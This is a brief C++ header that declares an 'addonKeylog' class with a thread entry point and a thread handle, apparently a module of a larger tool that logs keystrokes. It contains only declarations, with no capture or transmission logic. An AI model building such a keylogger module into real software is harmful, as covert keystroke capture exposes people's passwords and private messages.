#pragma once

#include "addon.h"





class addonKeylog
{

public:

	static DWORD Thread(void *lpParam);
	bool threadActive;

	addonKeylog();
	~addonKeylog();

private:

	HANDLE threadHandle;
};